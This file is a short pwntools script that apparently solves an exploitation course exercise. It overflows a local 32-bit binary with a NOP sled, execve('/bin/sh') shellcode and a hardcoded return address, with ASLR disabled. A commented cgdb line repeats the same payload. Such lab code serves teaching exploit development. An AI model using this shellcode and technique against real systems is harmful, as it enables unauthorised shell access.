from pwn import *

# dont forget to cancel ASLR locally on your machine

exercise = '/home/daniel/git/cyber/exploitation/ex3/ex3.out'

shell_code = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
offset_to_eip = 112
address_return = p32(0xffffd0a0)  #hardcoded to an nop instruction inside the buffer
len_of_shellcode = len(shell_code)
nop = b'\x90'


argument = nop*(offset_to_eip - len_of_shellcode) + shell_code + address_return
p = gdb.debug([exercise, argument]) 
p.interactive()  #when a gdb terminal is open, type 'continue' and make sure you have in the original terminal


# # cgdb --args ./ex3.out "`echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\xa0\xd0\xff\xff"`"

